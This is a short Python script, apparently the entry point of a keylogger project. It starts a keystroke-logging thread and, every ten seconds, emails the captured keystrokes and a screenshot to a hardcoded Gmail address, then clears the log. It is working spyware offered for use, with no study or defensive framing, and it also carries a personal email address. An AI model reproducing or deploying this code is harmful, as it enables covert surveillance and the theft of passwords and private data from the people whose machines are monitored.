import schedule
import time
import threading
from keylogger.mail_service import send_email
from keylogger.utils import *
from keylogger.keylog import Keylog

def monitoring(keylogger):
    send_email(receiver_mail="immanromanaj@gmail.com",subject = "Welcome!!!",body = keylogger.log,attachment = take_screenshot())
    keylogger.log=""          

def main():
    try:
        print("Hi")
        keylog = Keylog(10)
        print("start")
        threading.Thread(target=keylog.start).start()
        print("end")
        schedule.every(10).seconds.do(lambda:monitoring(keylog))
    except Exception as e:
        print(f'Error in Main Program {e}' )

# def looper():
    while True:
        try:
            schedule.run_pending()
            time.sleep(1)
        except KeyboardInterrupt:
            print("Script interrupted by user.")
            break
        except Exception as e:
            print(f"An error occurred in the main loop: {e}")

if __name__ == "__main__":
    main()